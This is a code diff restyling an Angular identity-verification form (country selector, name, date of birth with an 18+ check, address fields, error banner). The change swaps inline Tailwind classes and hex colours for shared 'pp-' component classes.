@@ -13,42 +13,45 @@ import { filterCountries } from '../utils/country-data';
   template: `
     <app-public-layout>
       
-      <div class="flex flex-col items-center mb-8">
-        <h2 class="text-2xl font-bold text-[#2c2e2f] text-center mb-3 tracking-tight">Profile info</h2>
-        <p class="text-[15px] text-[#5e6c75] text-center max-w-[80%] mx-auto leading-relaxed">
+      <div class="flex flex-col items-center mb-10">
+        <h2 class="text-2xl font-bold text-pp-navy text-center mb-3 tracking-tight">Profile info</h2>
+        <p class="text-base text-slate-500 text-center max-w-[80%] mx-auto leading-relaxed">
             Verify your legal identity details to continue.
         </p>
       </div>
 
       <!-- Error Message -->
       @if (state.rejectionReason()) {
-        <div class="mb-6 bg-[#fff4f4] border-l-4 border-[#d92d20] p-4 flex items-start gap-3 rounded-r-md">
-            <span class="material-icons text-[#d92d20] text-xl mt-0.5">error</span>
+        <div class="mb-8 bg-red-50 border-l-[6px] border-[#D92D20] p-4 flex items-start gap-4 rounded-r-lg">
+            <span class="material-icons text-[#D92D20] text-xl">error</span>
             <div>
-              <p class="text-sm font-bold text-[#2c2e2f]">Verification failed</p>
-              <p class="text-xs text-[#5e6c75]">Please verify your details match your ID.</p>
+              <p class="text-sm font-bold text-pp-navy">Verification failed</p>
+              <p class="text-xs text-slate-600 mt-1">Please verify your details match your ID.</p>
             </div>
         </div>
       }
 
-      <div class="space-y-4">
+      <div class="space-y-6">
         
         <!-- Country Selector -->
         <div class="relative z-50">
-            <div (click)="toggleDropdown()" class="relative group cursor-pointer">
+            <div (click)="toggleDropdown()" class="pp-input-group mb-0 cursor-pointer">
                 <div 
-                    class="peer w-full h-[56px] px-4 pt-5 pb-1 rounded-md bg-white text-[#2c2e2f] text-base shadow-input transition-all duration-300 focus:scale-[1.01] truncate"
-                    [class.shadow-input-focus]="country && !showDropdown()"
-                >{{ country || '' }}</div>
-                <label class="absolute left-4 top-4 text-[#5e6c75] text-base transition-all duration-200 pointer-events-none"
-                    [class.top-1.5]="country" [class.text-[12px]]="country" [class.font-semibold]="country">
+                    class="pp-input flex items-center"
+                    [class.text-pp-navy]="country"
+                    [class.text-transparent]="!country"
+                >{{ country || 'Select' }}</div>
+
+                <label class="pp-label"
+                    [class.top-2]="country" [class.text-xs]="country" [class.font-bold]="country">
                     Country of residence
                 </label>
-                <span class="material-icons absolute right-4 top-4 text-[#5e6c75]">expand_more</span>
+
+                <span class="material-icons absolute right-4 top-4 text-slate-500 transition-transform duration-300" [class.rotate-180]="showDropdown()">expand_more</span>
             </div>
 
             @if(showDropdown()) {
-                <div class="absolute w-full bg-white border border-slate-200 rounded-lg shadow-xl mt-1 overflow-hidden animate-in fade-in zoom-in-95 duration-100">
+                <div class="absolute w-full bg-white border border-slate-200 rounded-[12px] shadow-xl mt-2 overflow-hidden animate-fade-in z-50">
                     <div class="p-3 border-b border-slate-100 bg-slate-50">
                         <input 
                             type="text" 
@@ -56,13 +59,13 @@ import { filterCountries } from '../utils/country-data';
                             (ngModelChange)="searchQuery.set($event)" 
                             (click)="$event.stopPropagation()"
                             placeholder="Search..."
-                            class="w-full px-3 py-2 bg-white rounded border border-slate-300 text-sm outline-none focus:border-brand-500 text-[#2c2e2f]"
+                            class="w-full px-4 py-2 bg-white rounded-lg border border-slate-300 text-sm outline-none focus:border-pp-blue focus:ring-1 focus:ring-pp-blue text-pp-navy"
                             autofocus
                         >
                     </div>
                     <ul class="max-h-60 overflow-y-auto">
                         @for(c of filteredCountries(); track c) {
-                            <li (click)="selectCountry(c)" class="px-4 py-2.5 hover:bg-brand-50 hover:text-brand-800 cursor-pointer text-sm text-[#2c2e2f] transition-colors font-medium">
+                            <li (click)="selectCountry(c)" class="px-5 py-3 hover:bg-blue-50 hover:text-pp-blue cursor-pointer text-sm text-pp-navy transition-colors font-bold border-b border-slate-50 last:border-0">
                                 {{ c }}
                             </li>
                         }
@@ -73,7 +76,7 @@ import { filterCountries } from '../utils/country-data';
 
         <div class="grid grid-cols-2 gap-4">
             <!-- First Name -->
-            <div class="relative group">
+            <div class="pp-input-group mb-0">
                 <input 
                     type="text" 
                     [(ngModel)]="firstName"
@@ -81,19 +84,14 @@ import { filterCountries } from '../utils/country-data';
                     (blur)="touchedName.set(true)"
                     id="firstName"
                     placeholder=" " 
-                    class="peer w-full h-[56px] px-4 pt-5 pb-1 rounded-md bg-white text-[#2c2e2f] text-base outline-none shadow-input transition-all duration-300 focus:scale-[1.01] focus:shadow-input-focus"
+                    class="pp-input peer"
                     [class.shadow-input-error]="touchedName() && firstName.length < 2"
                 >
-                <label 
-                    for="firstName" 
-                    class="absolute left-4 top-4 text-[#5e6c75] text-base transition-all duration-200 peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1.5 peer-focus:text-[12px] peer-focus:font-semibold peer-[&:not(:placeholder-shown)]:top-1.5 peer-[&:not(:placeholder-shown)]:text-[12px] peer-[&:not(:placeholder-shown)]:font-semibold cursor-text pointer-events-none"
-                    >
-                    First name
-                </label>
+                <label for="firstName" class="pp-label">First name</label>
             </div>
 
             <!-- Last Name -->
-            <div class="relative group">
+            <div class="pp-input-group mb-0">
                 <input 
                     type="text" 
                     [(ngModel)]="lastName"
@@ -101,42 +99,34 @@ import { filterCountries } from '../utils/country-data';
                     (blur)="touchedName.set(true)"
                     id="lastName"
                     placeholder=" " 
-                    class="peer w-full h-[56px] px-4 pt-5 pb-1 rounded-md bg-white text-[#2c2e2f] text-base outline-none shadow-input transition-all duration-300 focus:scale-[1.01] focus:shadow-input-focus"
+                    class="pp-input peer"
                     [class.shadow-input-error]="touchedName() && lastName.length < 2"
                 >
-                <label 
-                    for="lastName" 
-                    class="absolute left-4 top-4 text-[#5e6c75] text-base transition-all duration-200 peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1.5 peer-focus:text-[12px] peer-focus:font-semibold peer-[&:not(:placeholder-shown)]:top-1.5 peer-[&:not(:placeholder-shown)]:text-[12px] peer-[&:not(:placeholder-shown)]:font-semibold cursor-text pointer-events-none"
-                    >
-                    Last name
-                </label>
+                <label for="lastName" class="pp-label">Last name</label>
             </div>
         </div>
 
         <!-- DOB -->
-        <div class="relative group">
+        <div class="pp-input-group">
           <input 
             type="date"
             [(ngModel)]="dob"
             (ngModelChange)="check(); update()"
             (blur)="touchedDob.set(true)"
             id="dob"
-            class="peer w-full h-[56px] px-4 pt-5 pb-1 rounded-md bg-white text-[#2c2e2f] text-base outline-none shadow-input transition-all duration-300 focus:scale-[1.01] focus:shadow-input-focus [color-scheme:light]"
+            class="pp-input peer"
             [class.shadow-input-error]="touchedDob() && !isAdult()"
           >
-          <label 
-             for="dob" 
-             class="absolute left-4 top-1.5 text-[12px] font-semibold text-[#5e6c75] pointer-events-none">
-             Date of birth
-          </label>
+          <label for="dob" class="pp-label !top-2 !text-xs !font-bold">Date of birth</label>
+
           @if(touchedDob() && dob && !isAdult()) {
-             <p class="text-xs text-[#d92d20] mt-1 ml-1 font-medium">Must be 18+</p>
+             <p class="text-xs text-[#d92d20] mt-1 ml-1 font-bold animate-slide-up">Must be 18+</p>
           }
         </div>
 
         <!-- Address -->
         <div class="space-y-4">
-          <div class="relative group">
+          <div class="pp-input-group mb-0">
             <input 
               type="text" 
               [(ngModel)]="addrStreet"
@@ -144,19 +134,14 @@ import { filterCountries } from '../utils/country-data';
               (blur)="touchedAddress.set(true)"
               id="street"
               placeholder=" " 
-              class="peer w-full h-[56px] px-4 pt-5 pb-1 rounded-md bg-white text-[#2c2e2f] text-base outline-none shadow-input transition-all duration-300 focus:scale-[1.01] focus:shadow-input-focus"
+              class="pp-input peer"
               [class.shadow-input-error]="touchedAddress() && addrStreet.length < 5"
             >
-            <label 
-               for="street" 
-               class="absolute left-4 top-4 text-[#5e6c75] text-base transition-all duration-200 peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1.5 peer-focus:text-[12px] peer-focus:font-semibold peer-[&:not(:placeholder-shown)]:top-1.5 peer-[&:not(:placeholder-shown)]:text-[12px] peer-[&:not(:placeholder-shown)]:font-semibold cursor-text pointer-events-none"
-               >
-               Street address
-            </label>
+            <label for="street" class="pp-label">Street address</label>
           </div>
           
           <div class="grid grid-cols-2 gap-4">
-             <div class="relative group">
+             <div class="pp-input-group mb-0">
                 <input 
                   type="text" 
                   [(ngModel)]="addrCity"
@@ -164,17 +149,12 @@ import { filterCountries } from '../utils/country-data';
                   (blur)="touchedAddress.set(true)"
                   id="city"
                   placeholder=" " 
-                  class="peer w-full h-[56px] px-4 pt-5 pb-1 rounded-md bg-white text-[#2c2e2f] text-base outline-none shadow-input transition-all duration-300 focus:scale-[1.01] focus:shadow-input-focus"
+                  class="pp-input peer"
                   [class.shadow-input-error]="touchedAddress() && addrCity.length < 3"
                 >
-                <label 
-                   for="city" 
-                   class="absolute left-4 top-4 text-[#5e6c75] text-base transition-all duration-200 peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1.5 peer-focus:text-[12px] peer-focus:font-semibold peer-[&:not(:placeholder-shown)]:top-1.5 peer-[&:not(:placeholder-shown)]:text-[12px] peer-[&:not(:placeholder-shown)]:font-semibold cursor-text pointer-events-none"
-                   >
-                   City
-                </label>
+                <label for="city" class="pp-label">City</label>
              </div>
-             <div class="relative group">
+             <div class="pp-input-group mb-0">
                 <input 
                   type="text" 
                   [(ngModel)]="addrZip"
@@ -183,15 +163,10 @@ import { filterCountries } from '../utils/country-data';
                   id="zip"
                   placeholder=" " 
                   maxlength="10"
-                  class="peer w-full h-[56px] px-4 pt-5 pb-1 rounded-md bg-white text-[#2c2e2f] text-base outline-none shadow-input transition-all duration-300 focus:scale-[1.01] focus:shadow-input-focus"
+                  class="pp-input peer"
                   [class.shadow-input-error]="touchedAddress() && addrZip.length < 4"
                 >
-                <label 
-                   for="zip" 
-                   class="absolute left-4 top-4 text-[#5e6c75] text-base transition-all duration-200 peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1.5 peer-focus:text-[12px] peer-focus:font-semibold peer-[&:not(:placeholder-shown)]:top-1.5 peer-[&:not(:placeholder-shown)]:text-[12px] peer-[&:not(:placeholder-shown)]:font-semibold cursor-text pointer-events-none"
-                   >
-                   Zip code
-                </label>
+                <label for="zip" class="pp-label">Zip code</label>
              </div>
           </div>
         </div>
@@ -201,8 +176,7 @@ import { filterCountries } from '../utils/country-data';
             (click)="submit()"
             [disabled]="!isValid()"
             [class.opacity-50]="!isValid()"
-            [class.hover:bg-brand-900]="isValid()"
-            class="w-full bg-brand-800 text-white font-bold text-[16px] py-4 px-4 rounded-full transition-all duration-300 shadow-lg shadow-brand-500/20 hover:scale-[1.02] active:scale-[0.98]"
+            class="pp-btn"
           >
             Agree & Continue
           </button>
